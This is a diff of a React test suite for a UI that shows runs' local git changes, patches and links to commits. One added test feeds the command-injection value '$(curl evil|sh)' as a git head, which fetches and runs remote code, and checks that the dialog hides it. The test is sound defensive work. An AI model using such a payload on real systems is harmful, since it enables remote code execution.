@@ -60,10 +60,10 @@ describe('LocalChangesTag', () => {
     const { container } = renderWithProviders(<>
       <LocalChangesTag output={run(1, changes({ dirty: false }))}/>
       <LocalChangesTag output={run(2)}/>
-      <LocalChangesSharedContext value="aaa"><LocalChangesTag output={run(3, changes())}/></LocalChangesSharedContext>
+      <LocalChangesSharedContext value="3f2a1b9c0d1e2f30:aaa"><LocalChangesTag output={run(3, changes())}/></LocalChangesSharedContext>
     </>);
     expect(container).toBeEmptyDOMElement();
-    renderWithProviders(<LocalChangesSharedContext value="aaa"><LocalChangesTag output={run(4, changes({ sha256: 'bbb' }))}/></LocalChangesSharedContext>);
+    renderWithProviders(<LocalChangesSharedContext value="3f2a1b9c0d1e2f30:aaa"><LocalChangesTag output={run(4, changes({ sha256: 'bbb' }))}/></LocalChangesSharedContext>);
     expect(screen.getByText('+40 −12 · 3 files')).toBeInTheDocument();
   });
 });
@@ -102,6 +102,12 @@ describe('the batch callout', () => {
     expect(screen.getByText('These local runs used 3 different sets of local changes')).toBeInTheDocument();
     fireEvent.click(screen.getByRole('button', { name: 'View' }));
     await waitFor(() => expect(new URLSearchParams(window.location.search).get('selected_views')).toBe('local-changes'));
+  });
+
+  it('offers to view changes git could not tell', () => {
+    renderBatch([run(1, changes({ dirty: null })), run(2, changes({ dirty: null }))]);
+    expect(screen.getByText(/Local runs on/)).toHaveTextContent("Local runs on 3f2a1b9c: git couldn't tell whether they had local changes");
+    expect(screen.getByRole('button', { name: 'View' })).toBeInTheDocument();
   });
 
   it('keeps the old warning for runs that recorded nothing', () => {
@@ -162,6 +168,20 @@ describe('LocalChangesDialog', () => {
     expect(await screen.findByTestId('diff')).toHaveTextContent('+old ➡️ diff --git a/src/a.py b/src/a.py +new');
   });
 
+  it('only shows patches small enough', async () => {
+    files['/s/2/.qaboard/local-changes.patch'] = 'x'.repeat(6 * 1024 * 1024);
+    open(run(2, changes()));
+    expect(await screen.findByText(/too large to show here/)).toHaveTextContent('The patch is over 6.0 MB: too large to show here.');
+    expect(screen.queryByTestId('editor')).toBeNull();
+    delete files['/s/2/.qaboard/local-changes.patch'];
+  });
+
+  it("hides git commands built from what isn't a sha", () => {
+    open(run(1, changes({ head: '$(curl evil|sh)' })));
+    expect(screen.queryByText('With git')).toBeNull();
+    expect(screen.getByRole('dialog')).not.toHaveTextContent('curl');
+  });
+
   it("doesn't offer to compare the same changes", () => {
     open(run(1, changes()), run(9, changes()));
     expect(screen.queryByRole('button', { name: /Compare/ })).toBeNull();
@@ -173,7 +193,7 @@ describe('LocalChangesView', () => {
   it('lists the distinct states, with their runs', () => {
     const groups = group_local_changes([run(1, changes()), run(2, changes()), run(3, changes({ dirty: false, pushed: true })), run(4)]);
     renderWithProviders(<LocalChangesView groups={groups}/>);
-    expect(screen.getByText('The runs shown ran 2 different versions of the code. 1 run didn\'t record their local changes.')).toBeInTheDocument();
+    expect(screen.getByText('The runs shown recorded 2 different sets of local changes. 1 run didn\'t record their local changes.')).toBeInTheDocument();
     expect(screen.getByText('Uncommitted changes: 3 files, +40 −12')).toBeInTheDocument();
     expect(screen.getByText('No local changes')).toBeInTheDocument();
     fireEvent.click(screen.getByRole('button', { name: '2 runs' }));
@@ -191,5 +211,18 @@ describe('the Code menu', () => {
     renderWithProviders(<Menu><CodeMenu project="kitefin/isp" project_data={project_data} commit={{ id: '0123456789abcdef' }} unpushed={{ sha: '0123456789abcdef' }}/></Menu>);
     fireEvent.mouseEnter(screen.getByRole('menuitem', { name: /Code/ }));
     expect(await screen.findByText(/Not pushed: the git host doesn't have/)).toHaveTextContent("Not pushed: the git host doesn't have 01234567 yet");
+    // links to the commit would 404: the menu goes to the repository, and to the last pushed commit
+    expect(screen.getByRole('menuitem', { name: /Changes in/ })).toHaveAttribute('aria-disabled', 'true');
+    expect(screen.getByRole('menuitem', { name: /^Code/ }).closest('a') ?? screen.getByRole('menuitem', { name: /^Code/ })).toHaveAttribute('href', 'https://github.com/kitefin/isp');
+  });
+
+  it('links to the last pushed commit', async () => {
+    const { Menu } = await import('@blueprintjs/core');
+    const { CodeMenu } = await import('../../../AppSider');
+    const project_data = { data: { git: { web_url: 'https://github.com/kitefin/isp', path_with_namespace: 'kitefin/isp' } } };
+    renderWithProviders(<Menu><CodeMenu project="kitefin/isp" project_data={project_data} commit={{ id: '0123456789abcdef' }} unpushed={{ sha: '0123456789abcdef', base: 'bbbbbbbbcccc' }}/></Menu>);
+    fireEvent.mouseEnter(screen.getByRole('menuitem', { name: /Code/ }));
+    const item = await screen.findByRole('menuitem', { name: /Last pushed commit, bbbbbbbb/ });
+    expect(item.closest('a') ?? item).toHaveAttribute('href', 'https://github.com/kitefin/isp/commit/bbbbbbbbcccc');
   });
 });
